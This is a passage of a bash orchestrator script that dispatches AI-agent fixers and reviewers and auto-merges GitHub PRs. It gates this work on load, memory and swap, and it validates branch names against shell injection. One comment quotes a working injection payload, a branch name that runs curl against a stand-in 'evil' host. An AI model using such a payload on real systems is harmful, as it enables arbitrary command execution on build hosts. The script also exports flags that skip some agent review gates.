#!/bin/bash
# orch-loop.sh — self-sustaining orchestrator loop (bash 3.2).
# Fast, non-blocking cycle: heartbeat -> merge sweep -> capacity-gated dispatch -> background refresh.
set -u
OR="${OR:-daniel-ospina/tortoise}"
# ⛔ THE OLD DEFAULT POINTED AT A PATH THAT DOES NOT EXIST ON THIS BOX
# (/Users/home/eldato/tortoise). Under the shipped launchd job this is only a FALLBACK --
# install.sh renders its own REPO into the plist via __REPO__, and that value overrides this one.
# It still matters for every REPO-less run (manual starts, the runbook, a re-install without env),
# and there a missing path is indistinguishable from "nothing to do" -- the same class as the
# gh-shim failure (#8246). Corrected, and made to fail LOUD rather than run against a path with
# nothing in it. (Corrected after a fresh-context verifier showed the original comment misstated
# the mechanism -- see the review on this PR.)
REPO="${REPO:-/Users/danielospina/Documents/GitHub/tortoise}"
if [ ! -d "$REPO" ]; then echo "orch-loop: FATAL REPO=$REPO does not exist" >&2; exit 78; fi
O="${O:-$HOME/orchestrator}"
export PATH=/opt/homebrew/bin:/usr/local/bin:$PATH
export AGENT_SKIP_REVIEW_GATE=1 ELDATO_SKIP_VGATE=1

MAX_FIX="${MAX_FIX:-3}"
MAX_FIX_TRIES="${MAX_FIX_TRIES:-3}"
# ⛔ MAX_LOAD IS A SANITY CEILING, NOT A THROUGHPUT TARGET -- and 16 was too tight for this box.
# Measured 2026-10-13 over 3940 log lines of the live harness: 103 were
# `[dispatch] skipped (load=N>=max_load=16)` and 96 were merge-priority. The gate DID open when
# load dipped below 16 (13 `[dispatch] load=` lines exist in that window), so the accurate claim is
# that it is too tight for a 17-workspace fleet on 10 cores -- NOT that it never opened. The box
# merged 25 PRs in a day at load 17-52 and has been observed functioning at ~100; a ceiling at 16
# leaves the dispatcher off for most of the day.
# (Corrected after a fresh-context verifier counted the dispatch lines the first claim ignored.)
# The REAL capacity constraint is the machine (available RAM / swap) -- see the gate chain below.
# Derive the ceiling from the core count so it scales, and keep the env override.
# sysctl -n hw.ncpu is macOS-only: on a Linux cell sysctl may be absent entirely (Debian's procps
# does not ship it any more — verified in debian:stable-slim) and hw.ncpu is a macOS key regardless,
# so the fallback silently pinned _NCPU=4 for EVERY cell and MAX_LOAD=40 with it (#1702).
is_num() { case "${1:-}" in ''|*[!0-9]*) return 1 ;; *) return 0 ;; esac; }
_NCPU="$(sysctl -n hw.ncpu 2>/dev/null || nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 4)"
# Coerce HERE — immediately before the ONLY reads of _NCPU and MAX_LOAD, not in the input-validation
# block 30 lines below. A guard placed THERE guarded nothing (#1702 review): MAX_LOAD is derived on
# the next line, a non-numeric _NCPU already made `$(( _NCPU * 10 ))` fail, and under `set -u` the
# loop then aborted at the first `[ "$L" -ge "$MAX_LOAD" ]` — the same failure class this PR fixes.
# MAX_LOAD gets the same coercion for the same reason every other threshold below does: it is
# supplied by the launchd plist, and a typo there would open the load gate rather than close it
# (`[ -ge ]` on a non-number is FALSE, and a false test in the gate chain ALLOWS dispatch).
is_num "${_NCPU:-}"    || _NCPU=4
MAX_LOAD="${MAX_LOAD:-$(( _NCPU * 10 ))}"
is_num "${MAX_LOAD:-}" || MAX_LOAD=$(( _NCPU * 10 ))
MAX_LANES="${MAX_LANES:-4}"
MAX_REVIEW="${MAX_REVIEW:-4}"   # keep in sync with install.sh's default and README §4
MERGE_PRIORITY_AT="${MERGE_PRIORITY_AT:-10}"   # above this many open PRs, drain before dispatching
MIN_SWAP_FREE="${MIN_SWAP_FREE:-600}"
# Available memory = free + inactive. macOS shows memory pressure as COMPRESSION with swap flat,
# so a swap-only gate does not see it. See the gate chain below.
MIN_MEM_FREE_MB="${MIN_MEM_FREE_MB:-512}"
BATCH="${BATCH:-2}"
CYC="${CYC:-240}"
REQ="ai-review-gate python-ci-gate docs test-isolation license-surface legal-e2e pricing-artifact"

mkdir -p "$O/logs" "$O/state"
LOG="$O/logs/orch-loop.log"
touch "$O/dispatched.txt" "$O/candidates.txt" "$O/checked.txt"
chmod +x "$O"/*.sh 2>/dev/null

# ── input validation ───────────────────────────────────────────────────────────
# These values come from the GitHub API and are then embedded in shell strings that tmux runs via
# `sh -c`, so they are attacker-controlled. git permits ' ; $ ` & | ( ) { } " < > # in a ref name
# (only spaces are forbidden, and ${IFS} supplies those), so a fork PR on branch
# `fix/x';curl${IFS}evil;#` achieved arbitrary command execution on the merge host. Validate.
safe_ref() {
  case "${1:-}" in ''|*[!A-Za-z0-9._/-]*) return 1 ;; esac
  git -C "$REPO" check-ref-format --branch "$1" >/dev/null 2>&1
}
# A non-numeric threshold makes `[ -le ]` ERROR -- which returns false, and a false test in the gate
# chain OPENS the gate. So a typo in the plist env (MIN_MEM_FREE_MB=abc) would silently remove the very
# back-pressure these gates exist to apply. Coerce to the documented default instead of failing open.
is_num "${MIN_SWAP_FREE:-600}"   || MIN_SWAP_FREE=600
is_num "${MIN_MEM_FREE_MB:-512}" || MIN_MEM_FREE_MB=512

# ── portable OS primitives ─────────────────────────────────────────────────────
# This harness runs on macOS (the operator's box, launchd) AND on a Linux cell
# (cloud-cell-supervisor.sh), so every probe below carries both a Linux and a macOS path.
# Found the hard way (#1702): `stat -f '%m'`, `sysctl -n vm.loadavg` and `sysctl -n vm.swapusage`
# are BSD/macOS-only. On GNU coreutils `stat -f '%m' F` prints the FILESYSTEM LISTING on STDOUT and
# exits 1 — so `$(stat -f '%m' F 2>/dev/null || echo $(date +%s))` captured the listing PLUS the
# fallback, the arithmetic failed, `age` was left unset, and under `set -u` the next
# `[ "$age" -gt ... ]` aborted the whole controller. Reachable ~1 cycle after the first dispatch on
# every cell (each lane/merge/fix writes the log the reaper stats). Reproduced on GNU coreutils 9.7
# (debian:stable-slim): `age: unbound variable`, rc=1, no cycle completes.
# GNU first, BSD second — deliberately NOT the other way round, and this is why the obvious
# `stat -f '%m' F || stat -c '%Y' F` ladder is wrong: on GNU the FIRST form does not fail quietly,
# it writes the listing to stdout before exiting 1, and `||` cannot discard stdout. In this order
# `stat -c '%Y'` is a clean failure on BSD (empty stdout, rc 1), so exactly one numeric line results.
file_mtime_epoch() { # <file> -> mtime as epoch seconds; NON-ZERO rc when unreadable (never a guess)
  local m
  m="$(stat -c '%Y' "$1" 2>/dev/null || stat -f '%m' "$1" 2>/dev/null)" || return 1
  is_num "$m" || return 1
  printf '%s\n' "$m"
}
# 1-min load average. THE FIELD DIFFERS: /proc field 1 IS the 1-min load, while macOS
# `sysctl vm.loadavg` prints `{ 1.70 1.90 2.00 }`, so field 2 is. One shared awk would therefore
# read the wrong field on one of the two platforms — the bug this function's test pins.
# The argument is a TEST SEAM (the call site passes nothing), the same idiom as mp_reason() /
# review_slots(): without it the Linux branch could only be exercised on a Linux host.
load1() { # [<loadavg-file>]
  local p="${1:-/proc/loadavg}"
  if [ -r "$p" ]; then
    awk '{printf "%d\n", $1}' "$p" 2>/dev/null
  else
    sysctl -n vm.loadavg 2>/dev/null | awk '{print int($2)}'
  fi
}
# Swap as MB. Linux reports kB in /proc/meminfo; macOS prints `total = 2048.00M ... free = ...`.
# Echoes "<free_mb> <total_mb>"; NON-ZERO rc when unmeasurable, so the caller can tell "no swap
# configured" (total 0 — the documented allow) from "we could not read it". An unreadable probe is
# NOT treated as pressure: that decision is argued at the gate chain, where the value is consumed.
# The argument is a TEST SEAM (the call site passes nothing).
swap_usage_mb() { # [<meminfo-file>]
  local p="${1:-/proc/meminfo}"
  if [ -r "$p" ]; then
    awk '/^SwapTotal:/{t=$2} /^SwapFree:/{f=$2}
         END {if (t=="" || f=="") exit 1; printf "%d %d\n", f/1024, t/1024}' "$p" 2>/dev/null
  else
    sysctl -n vm.swapusage 2>/dev/null | awk '
      {for(i=1;i<=NF;i++){if($i=="total")t=$(i+2); if($i=="free")f=$(i+2)}}
      END {if (t=="" || f=="") exit 1; printf "%d %d\n", f, t}'
  fi
}
# Available memory as MB. Linux: /proc/meminfo MemAvailable, falling back to MemFree+Cached on a
# kernel too old to expose it; macOS: `free` + `inactive` vm_stat pages (top's "unused" PhysMem is a
# different figure, and macOS shows pressure as COMPRESSION with swap flat). NON-ZERO rc when
# unmeasurable, and the CALLER MUST keep treating that as UNKNOWN -> do not add work: unlike load and
# swap this probe is deliberately FAIL-CLOSED ("UNKNOWN, not ample"), and that ruling is not this
# function's to change. Before #1702 there was no Linux path at all, so on a cell the probe yielded
# empty, MEM_UNKNOWN was set every cycle, and the capacity gate named `mem_probe_failed` forever —
# the controller completed cycles and dispatched nothing, which is the false green #1702 exists to
# remove. The macOS page size is derived from vm_stat's own header (16 KiB is Apple silicon; Intel
# Macs are supported and a hardcoded 16384 over-reports memory 4x -- the unsafe direction).
# The argument is a TEST SEAM (the call site passes nothing).
mem_avail_mb() { # [<meminfo-file>]
  local p="${1:-/proc/meminfo}" mb
  if [ -r "$p" ]; then
    mb="$(awk '
      /^MemAvailable:/ {a=$2}
      /^MemFree:/ {f=$2}
      /^Cached:/ {c=$2}
      END {if (a!="") v=a; else if (f!="" && c!="") v=f+c; else exit 1
           printf "%d", v/1024}' "$p" 2>/dev/null)" || return 1
  else
    mb="$(vm_stat 2>/dev/null | awk '
      /page size of/ {ps=$8}
      /Pages free/ {gsub(/[.]/,"",$3); f=$3}
      /Pages inactive/ {gsub(/[.]/,"",$3); i=$3}
      END {if (ps=="") ps=16384; if (f=="" || i=="") exit 1
           printf "%d", (f+i)*ps/1048576}')" || return 1
  fi
  is_num "$mb" || return 1
  printf '%s\n' "$mb"
}
# $O is operator config, not attacker input, but a quote or metacharacter here would break every
# spawn (the tmux command string is executed via sh -c). Fail loudly instead of failing mysteriously.
case "$O" in
  *"'"*|*'"'*|*'`'*|*'$'*|*';'*|*'|'*|*'&'*|*' '*) echo "[fatal] \$O must not contain a quote or shell metacharacter: $O" >&2; exit 1 ;;
esac

# A stale claim must not mean "in flight" forever: merge-one.sh removes its claim only on clean
# exit, so a SIGKILLed worker or a reboot mid-merge would otherwise stall that PR permanently.
claim_live() {
  local f="$O/state/mergeclaim-$1.lock" p
  [ -f "$f" ] || return 1
  p="$(cat "$f" 2>/dev/null || echo 0)"
  [ "${p:-0}" -gt 0 ] && kill -0 "$p" 2>/dev/null && return 0
  rm -f "$f"; return 1
}

# single-instance lock (atomic: noclobber create fails if the file exists)
LOCKF="$O/.orch.lock"
acq() { ( set -o noclobber; echo $$ > "$LOCKF" ) 2>/dev/null; }
if ! acq; then
  OPID="$(cat "$LOCKF" 2>/dev/null || echo 0)"
  if [ "${OPID:-0}" -gt 0 ] && kill -0 "$OPID" 2>/dev/null; then echo "[orch-loop] already running (pid $OPID)"; exit 0; fi
  rm -f "$LOCKF"
  acq || { echo "[orch-loop] lock race — exiting"; exit 0; }
fi
# ⛔ THE SIGNAL HANDLERS ONLY TERMINATE — THE LOCK IS RELEASED BY THE `EXIT` TRAP ALONE.
# Was `trap 'rm -f "$LOCKF"' EXIT INT TERM`, and for INT/TERM a handler that RETURNS does NOT
# terminate: bash RESUMES the interrupted command loop, so the documented stop path
# (`pkill -f orch-loop.sh`, README §6) deleted the lock while the controller kept sweeping,
# reviewing and merging — the next start then passed acq() and two autonomous controllers ran one
# PR queue, which §5.2/§5.3 promise cannot happen (agent-infra#1715).
# Measured on /bin/bash 3.2.57 — the interpreter the rendered launchd plist invokes — with a stub
# loop: the returning trap printed and left the loop alive with the lock already gone; `exit 143`
# from a TERM handler terminated the shell (rc=143) AND still ran the EXIT trap; an UNTRAPPED TERM
# also stopped the loop, but an untrapped INT is IGNORED outright (still alive after 3s), so INT is
# trapped rather than dropped. Releasing from EXIT only makes "the lock is gone" and "the process
# is gone" the same event; a signal arriving after the handler fired leaves the lock in place
# (measured), which is fail-closed — `acq()` reclaims a dead pid.
trap 'exit 143' TERM
trap 'exit 130' INT
trap 'rm -f "$LOCKF"' EXIT

# A worker whose log has not grown in this many minutes is hung. `pi -p` has no internal
# timeout and a runaway child it spawns (a reviewer's `find /` ran for 8 hours on 2026-10-12)
# keeps the pane alive, so the concurrency caps — which count SESSIONS — silently halve.
STALE_MIN="${STALE_MIN:-40}"

# ── stale-worker reaper ───────────────────────────────────────────────────────
# Kill a worker that has gone silent. It only ever touches tmux sessions, so it can never reach
# the operator's own shell or any process outside the harness. The PR is re-dispatched by the
# normal sweep on the next cycle (the claim_live() check then sees a dead owner and frees it).
reap_stale_workers() {
  local s f age pid m
  for s in $(tmux ls -F '#{session_name}' 2>/dev/null | grep -E '^(merge|lane|fix)-'); do
    f="$O/logs/$s.log"
    [ -f "$f" ] || continue
    # An unreadable mtime means the age is UNKNOWN, and unknown is not evidence of a hang: skip the
    # session rather than reap it. Never let the probe's failure escape as an arithmetic error — on
    # a Linux cell that is exactly what aborted the controller one cycle after the first dispatch
    # (#1702): set -u turned the unassigned `age` into `File: unbound variable`.
    m="$(file_mtime_epoch "$f")" || continue
    age=$(( $(date +%s) - m ))
    [ "$age" -gt $((STALE_MIN * 60)) ] || continue
    pid="$(tmux list-panes -t "=$s" -F '#{pane_pid}' 2>/dev/null | head -1)"
    echo "[reap-worker] $s silent ${age}s -> killing session (pane_pid=${pid:-?})" >> "$LOG"
    # `=name` forces an EXACT session match. Without it tmux prefix-matches, so if this session
    # exited between the `tmux ls` snapshot above and here, `-t merge-82` would resolve to the
    # healthy `merge-821` and kill an in-flight worker (verified: `-t zzproof-10` killed
    # `zzproof-101`, while `-t =zzproof-10` errors instead).
    tmux kill-session -t "=$s" 2>/dev/null
    # tmux HUPs the pane's process group; a child that ignored it (e.g. a stuck find) is killed here.
    if [ -n "$pid" ]; then kill -TERM "$pid" 2>/dev/null; sleep 1; kill -KILL "$pid" 2>/dev/null; fi
  done
}

heartbeat() { date +%s > "$O/heartbeat"; }
# Exact session-name test. `tmux has-session -t <name>` prefix-matches, so a guard for PR #82
# would report "in flight" because `fix-820` exists — starving #82 while that worker lives.
sess() { tmux ls -F '#{session_name}' 2>/dev/null | grep -qx "$1"; }
# Spawning an agent during a load spike makes the spike worse. A Mac reboot lands in an indexing
# storm (Spotlight, PerfPowerServices, duetexpertd) that the LANE dispatch gate already respects
# while the merge sweep did not — so a fresh boot got six reviewers piled onto it. The cheap actions
# (gh pr merge / ready / run rerun) stay ungated, so merges keep flowing while the spike passes.
# Nothing is starved: a held-back spawn retries next cycle, because the marker that authorises it
# (needsfix-<PR>-<head>, fixcount-<PR>) is only written on a SUCCESSFUL spawn.
can_spawn() { [ "${L:-0}" -lt "$MAX_LOAD" ]; }

# Merge priority: a merge backlog means the box's scarce capacity belongs to review+merge, not to
# opening more PRs. These two functions hold the rule so it is directly testable (and so a
# regression cannot hide behind a comment):
#   mp_reason    -> the gate reason when draining should outrank dispatching (empty otherwise)
#   review_slots -> reviewer concurrency, with headroom once a backlog exists
mp_reason() { # <open_prs> <lanes>
  if [ "${1:-0}" -gt "$MERGE_PRIORITY_AT" ] && [ "${2:-0}" -ge 1 ]; then
    echo "merge-priority (${1} open PRs — draining before opening more)"
  fi
}
res_line() {
  local idle pmem f i w cmp avail swapfree swaptotal dline duse procs runnable svcs rate _sw
  # CPU
  local cpu; cpu="$(top -l 2 -n 0 2>/dev/null | awk '/CPU usage/{c=$0} END{sub(/^CPU usage: /,"",c); print c}')"
  # RAM (16 KiB pages on Apple silicon; compute from the header rather than hardcoding)
  pmem="$(vm_stat 2>/dev/null | awk '
    /page size of/ {ps=$8}
    /Pages free/ {gsub(/[.]/,"",$3); f=$3}
    /Pages inactive/ {gsub(/[.]/,"",$3); i=$3}
    /Pages wired/ {gsub(/[.]/,"",$4); w=$4}
    /occupied by compressor/ {gsub(/[.]/,"",$5); c=$5}
    END {if (ps=="") ps=16384; printf "%.2fG free/%.2fG inactive/%.2fG wired/%.2fG comp/%.2fG avail", f*ps/1e9, i*ps/1e9, w*ps/1e9, c*ps/1e9, (f+i)*ps/1e9}')"
  # swap + disk + processes (swap via the portable helper: a macOS-only probe logged '?' on a cell,
  # which is how the gate's absence stayed invisible in the logs — #1702)
  swapfree=""; swaptotal=""
  if _sw="$(swap_usage_mb)"; then swapfree="${_sw%% *}M"; swaptotal="${_sw##* }M"; fi
  dline="$(df -g /System/Volumes/Data 2>/dev/null | awk 'NR==2{printf "%dG free/%d%% used",$4,$5}')"
  procs="$(ps -Ao pid= 2>/dev/null | wc -l | tr -d ' ')"
  runnable="$(ps -Ao stat= 2>/dev/null | grep -c '^R')"
  # the macOS service sinks that have burned this box before, and kernel_task (thermal/I-O)
  svcs="$(ps -Ao pcpu=,comm= 2>/dev/null | awk '
    /opendirectoryd/ {o+=$1}
    /automountd/ {a+=$1}
    /kernel_task/ {k+=$1}
    /fseventsd/ {f+=$1}
    /mds_stores|mds$/ {m+=$1}
    END {printf "opendirectoryd=%.0f%% automountd=%.0f%% kernel_task=%.0f%% fseventsd=%.0f%% mds=%.0f%%", o,a,k,f,m}')"
  # GitHub API ceiling — a capacity limit that is NOT on this machine
  rate="$(gh api rate_limit --jq '.resources.graphql | "\(.remaining)/\(.limit)"' 2>/dev/null)"
  echo "[res] cpu(${cpu:-?}) | mem(${pmem:-?}) | swap(${swapfree:-?}/${swaptotal:-?}) | disk(${dline:-?}) | procs=$procs runnable=$runnable | svc(${svcs:-?}) | gh_gql=${rate:-?}" >> "$LOG"
}
review_slots() { # <open_prs>
  if [ "${1:-0}" -gt "$MERGE_PRIORITY_AT" ]; then echo $((MAX_REVIEW + 2)); else echo "$MAX_REVIEW"; fi
}

# Count of open PRs. This one number drives THREE decisions — scope (BROAD drain vs OWN), the
# reviewer budget (review_slots), and the merge-priority gate (mp_reason) — so a FAILED count must
# never be readable as "the queue is empty". The pre-fix line was
#   OPEN_N="$(gh pr list … 2>/dev/null)"; : "${OPEN_N:=0}"
# which discarded rc AND stderr, then coerced the empty result to 0: on 2026-10-12 a single
# `Post "https://api.github.com/graphql": net/http: TLS handshake timeout` logged
# `[scope] open=25 -> BROAD` then `[scope] open=0 -> OWN` in one cycle while 22 PRs were open —
# silently dropping the drain, the reviewer headroom and the merge-priority gate. A failure is now
# a DISTINCT, LOGGED 'unknown': rc is captured on its own line, gh's stderr is kept, and the count
# falls back to the sticky last-known value in state/last-open-n (11 on a first-ever failure ->
# BROAD, because resuming a drain is idempotent while opening more lanes is not). It never
# assigns 0.
open_pr_count() { # -> echoes the open-PR count; never 0 on failure
  local raw rc err sticky fc
  # `if …; then` rather than `raw=$(…); rc=$?` so this stays correct if errexit is ever enabled —
  # under `set -e` the bare assignment would exit the loop BEFORE rc was read, on a transient blip.
  if raw="$(gh pr list --repo "$OR" --state open --limit 300 --json number --jq 'length' 2>"$O/state/.open-err.$$")"; then
    rc=0
  else
    rc=$?
  fi
  err="$(tr '\n' ' ' < "$O/state/.open-err.$$" 2>/dev/null || true)"
  rm -f "$O/state/.open-err.$$"
  if [ "$rc" -ne 0 ] || ! is_num "$raw"; then
    sticky="$(cat "$O/state/last-open-n" 2>/dev/null || true)"
    # ⛔ A sticky 0 is NOT reused. A drained queue (last success = 0) is exactly when new PRs are
    # most likely to have arrived before this failure, and returning 0 drives the UNSAFE direction:
    # OWN scope, no reviewer headroom, no merge-priority gate. Reuse only a POSITIVE last-known;
    # absent / 0 / non-numeric assumes a count ABOVE the fallback threshold, because resuming a
    # drain is idempotent while opening more lanes is not. THIS is what "never 0 on failure" means.
    # The fallback must exceed BOTH the merge-priority tunable AND the scope gate's threshold (a
    # literal 10 below), so it is max(MERGE_PRIORITY_AT, 10) + 1 — keying it to the tunable alone
    # left a below-default tunable landing in OWN, the unsafe direction, on a failed count.
    # ⛔ Normalize to base 10 BEFORE the arithmetic: `[ … -ge … ]` parses base 10 but `$(( … ))`
    # parses base 0, where a leading 0 is OCTAL — so a tunable of `010` passed the guard as "ten"
    # and then evaluated as 8, returning 9 and landing in OWN again. Reject non-digits, then force
    # base 10 with `10#`.
    fc="${MERGE_PRIORITY_AT:-10}"
    case "$fc" in ''|*[!0-9]*) fc=10 ;; esac
    [ "$fc" -ge 10 ] || fc=10
    fc=$(( 10#$fc + 1 ))
    if is_num "$sticky" && [ "$sticky" -gt 0 ]; then
      echo "[scope] open=UNKNOWN rc=$rc (${err:-no stderr}) -> sticky last-known=$sticky" >> "$LOG"
      echo "$sticky"
    else
      echo "[scope] open=UNKNOWN rc=$rc (${err:-no stderr}) -> no positive last-known (sticky='${sticky:-none}'), assuming $fc (BROAD)" >> "$LOG"
      echo "$fc"
    fi
    return 0
  fi
  printf '%s\n' "$raw" > "$O/state/last-open-n"
  echo "$raw"
}

while true; do
  heartbeat
  res_line   # MEASURE every resource; decide nothing from it
  reap_stale_workers
  L="$(load1)"
  echo "=== $(date) load=$L lanes=$(tmux ls 2>/dev/null | grep -c '^lane-') backlog=$(wc -l < "$O/candidates.txt" | tr -d ' ') ===" >> "$LOG"

  # ---- 1) merge sweep (this box's open PRs) -------------------------------
  # scope: when the repo has >10 open PRs, help drain EVERYONE's (broad); otherwise just this box's.
  # FAILED counts are 'unknown', never 0 — see open_pr_count() above.
  OPEN_N="$(open_pr_count)"
  # Merge priority: a merge backlog means the box's scarce capacity belongs to review+merge, not to
  # opening more PRs. Give reviewers extra headroom above the backlog threshold (and section 2 stops
  # dispatching new lanes). Below it, run a mix. Tune with MERGE_PRIORITY_AT.
  MR="$(review_slots "$OPEN_N")"
  # Scope: >10 open PRs -> BROAD (help drain everyone's). Our OWN patterns are always included
  # even while drafts, because a draft is invisible to the checks below and nothing else would
  # ever ready it — our lanes' own drafts used to stall red forever (#8219, #8085).
  if [ "$OPEN_N" -gt 10 ]; then
    SEL='select(.headRefName|test("^design/|^scope/|^dependabot/")|not)'
    echo "[scope] open=$OPEN_N -> BROAD (help drain all)" >> "$LOG"
  else
    SEL='select(.headRefName|test("-tm$|-cap$|^fix/"))'
    echo "[scope] open=$OPEN_N -> OWN" >> "$LOG"
  fi
  # Same rule for the sweep listing: as a pipeline into `while read` with 2>/dev/null, a FAILED
  # listing yields ZERO iterations and prints NOTHING — the sweep silently does nothing for the
  # whole cycle. Capture it, check rc, log the failure, and feed the loop from the captured text.
  if SWEEP_LIST="$(gh pr list --repo "$OR" --state open --limit 300 --json number,headRefName,isDraft \
    --jq ".[]|select((.isDraft|not) or (.headRefName|test(\"-tm$|-cap$|^fix/\")))|$SEL|\"\(.number)\t\(.headRefName)\t\(.isDraft)\"" 2>"$O/state/.sweep-err.$$")"; then
    SWEEP_RC=0
  else
    SWEEP_RC=$?
  fi
  SWEEP_ERR="$(tr '\n' ' ' < "$O/state/.sweep-err.$$" 2>/dev/null || true)"; rm -f "$O/state/.sweep-err.$$"
  if [ "$SWEEP_RC" -ne 0 ]; then
    echo "[sweep] PR listing FAILED rc=$SWEEP_RC (${SWEEP_ERR:-no stderr}) — nothing swept this cycle" >> "$LOG"
  fi
  printf '%s\n' "${SWEEP_LIST:-}" |
  while IFS="$(printf '\t')" read -r PR BR DRAFT; do
    [ -z "${PR:-}" ] && continue
    # Skip anything that is not a plain integer PR / simple ref — never let API data reach a shell.
    is_num "$PR" || { echo "#${PR:-?} SKIPPED (non-numeric PR id)" >>"$LOG"; continue; }
    safe_ref "$BR" || { echo "#$PR SKIPPED (unsafe branch name: $BR)" >>"$LOG"; continue; }
    if [ "${DRAFT:-}" = "true" ]; then
      gh pr ready "$PR" --repo "$OR" >/dev/null 2>&1 && echo "#$PR readied (was a draft)" >>"$LOG"
      continue
    fi
    PR_ST="$(gh pr view "$PR" --repo "$OR" --json state --jq .state 2>/dev/null)"
    # CLOSED too: a PR listed open can close between `gh pr list` and here. The retired sweep.sh
    # guarded both; the live rewrite kept only MERGED, so a closed PR fell through to
    # `gh pr ready` + `gh pr merge` every cycle and logged `#<PR> merge fail` forever.
    case "${PR_ST:-}" in MERGED|CLOSED) continue ;; esac
    HEAD_N="$(gh pr view "$PR" --repo "$OR" --json headRefOid --jq .headRefOid 2>/dev/null)"
    # parked = the fixer cap was reached at THIS head; a later push re-arms the PR.
    [ -n "${HEAD_N:-}" ] && [ "$(cat "$O/state/parked-$PR" 2>/dev/null)" = "$HEAD_N" ] && continue
    V="$(gh pr checks "$PR" --repo "$OR" --json name,state 2>/dev/null | python3 -c "
import sys,json
try: d=json.load(sys.stdin)
except Exception: print('NOCHECKS'); raise SystemExit
m={c['name']:c['state'] for c in d}
want='$REQ'.split()
bad=lambda s: s in ('FAILURE','ERROR','CANCELLED','TIMED_OUT','ACTION_REQUIRED')
ok=lambda s: s in ('SUCCESS','FAILURE','ERROR','CANCELLED','TIMED_OUT','ACTION_REQUIRED','SKIPPED','NEUTRAL')
# ai-review-gate IS the merge authority, so it must be an explicit SUCCESS. SKIPPED/NEUTRAL
# there means no signed review exists; reading that as satisfied would merge without evidence.
gate=m.get('ai-review-gate','')
if gate != 'SUCCESS' and not bad(gate):
    print('FAILED:ai-review-gate'); raise SystemExit
fail=[n for n in want if bad(m.get(n,''))]
pend=[n for n in want if not ok(m.get(n,''))]
print(('FAILED:'+','.join(fail)) if fail else (('PENDING:'+','.join(pend)) if pend else 'GREEN'))
" 2>/dev/null)"
    # A CONFLICTING PR can never merge: `gh pr merge` fails every cycle and the queue looks stuck
    # while nothing changes. Route it to the fixer, which integrates origin/main and resolves the
    # conflict, then re-runs the review chain. Capped and parkable like any other fix loop.
    case "$V" in
      GREEN|PENDING:*)
        MSTAT="$(gh pr view "$PR" --repo "$OR" --json mergeable --jq .mergeable 2>/dev/null)"
        if [ "${MSTAT:-}" = "CONFLICTING" ]; then
          CF="$O/state/fixcount-$PR"; NFC="$(cat "$CF" 2>/dev/null || echo 0)"
          case "$NFC" in ''|*[!0-9]*) NFC=0 ;; esac
          if [ "$NFC" -ge "${MAX_FIX_TRIES:-3}" ]; then
            [ -f "$O/state/parked-$PR" ] || { echo "${HEAD_N:-}" > "$O/state/parked-$PR"; echo "#$PR PARKED (still CONFLICTING after $NFC fixes)" >>"$LOG"; }
          elif claim_live "$PR" || sess "fix-$PR" || sess "merge-$PR"; then
            : # a worker is already rebasing it
          elif [ "$(tmux ls 2>/dev/null | grep -c '^fix-')" -lt "${MAX_FIX:-3}" ] && can_spawn; then
            printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
            if tmux new-session -d -s "fix-$PR" "bash '$O/fix-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null; then
              echo $((NFC + 1)) > "$CF"
              echo "#$PR CONFLICTING -> fixer attempt $((NFC + 1))" >>"$LOG"
            else
              echo "#$PR CONFLICTING, fixer spawn FAILED" >>"$LOG"
            fi
          fi
          continue
        fi ;;
    esac
    case "$V" in
      GREEN)     gh pr ready "$PR" --repo "$OR" >/dev/null 2>&1 || true; gh pr merge "$PR" --repo "$OR" --squash >>"$LOG" 2>&1 && echo "#$PR MERGED" >>"$LOG" || echo "#$PR merge fail" >>"$LOG" ;;
      PENDING:*) gh pr ready "$PR" --repo "$OR" >/dev/null 2>&1 || true; gh pr merge "$PR" --repo "$OR" --squash --auto >>"$LOG" 2>&1 && echo "#$PR auto-armed" >>"$LOG" || true ;;
      FAILED:*)
        echo "#$PR $V" >>"$LOG"
        if echo "$V" | grep -q ai-review-gate; then
          # The claim file is written by merge-one.sh itself, so it also covers the chain-<N>
          # path (which invokes merge-one.sh directly and whose session name is invisible here).
          if claim_live "$PR" || sess "fix-$PR" || sess "merge-$PR"; then
            : # this PR already has a worker in flight
          else
            FIXN="$O/state/fixcount-$PR"; NF="$(cat "$FIXN" 2>/dev/null || echo 0)"
            case "$NF" in ''|*[!0-9]*) NF=0 ;; esac
            # a reviewer already reported real issues AT THIS HEAD -> fix them and re-run the chain.
            # otherwise the gate is probably just missing evidence -> re-record (fresh review).
            if [ -n "${HEAD_N:-}" ] && [ -f "$O/state/needsfix-$PR-$HEAD_N" ] \
               && [ "$NF" -lt "${MAX_FIX_TRIES:-3}" ] \
               && can_spawn \
               && [ "$(tmux ls 2>/dev/null | grep -c '^fix-')" -lt "${MAX_FIX:-3}" ]; then
              # Spawn FIRST, bookkeep only on success: recording the attempt before the spawn
              # means a killed/failed spawn consumes one of MAX_FIX_TRIES and deletes the
              # findings marker, so no fixer ever runs and the findings are lost.
              # Args travel in a file, not interpolated into the tmux command string, so no
              # PR-derived value can reach `sh -c`. Only $O (validated at startup) and the
              # numeric $PR are embedded.
              printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
              if tmux new-session -d -s "fix-$PR" "bash '$O/fix-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null; then
                echo $((NF + 1)) > "$FIXN"; rm -f "$O/state/needsfix-$PR-$HEAD_N"
                echo "#$PR fixer attempt $((NF + 1))" >>"$LOG"
              else
                echo "#$PR fixer spawn FAILED (attempt not consumed, marker kept)" >>"$LOG"
              fi
            elif [ "$NF" -ge "${MAX_FIX_TRIES:-3}" ] && [ -f "$O/state/needsfix-$PR-$HEAD_N" ]; then
              # Terminal state. Without this the cap just falls through to the re-record branch
              # every cycle: an unfixable PR would burn a full fresh-context review forever.
              echo "${HEAD_N:-}" > "$O/state/parked-$PR"
              echo "#$PR PARKED after $NF fixes at head=${HEAD_N:-?} — needs a human" >>"$LOG"
            elif [ "$(tmux ls 2>/dev/null | grep -c '^merge-')" -lt "$MR" ] && can_spawn; then
              printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
              tmux new-session -d -s "merge-$PR" "bash '$O/merge-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null \
                && echo "#$PR re-record" >>"$LOG"
            fi
          fi
        elif echo "$V" | grep -qE 'docs|test-isolation|license-surface|legal-e2e|pricing-artifact'; then
          # A required check OTHER than the review gate or python CI is red — docs lint, a committed
          # conflict marker, legal-e2e, test isolation. Nothing re-recorded or reran those, so such a
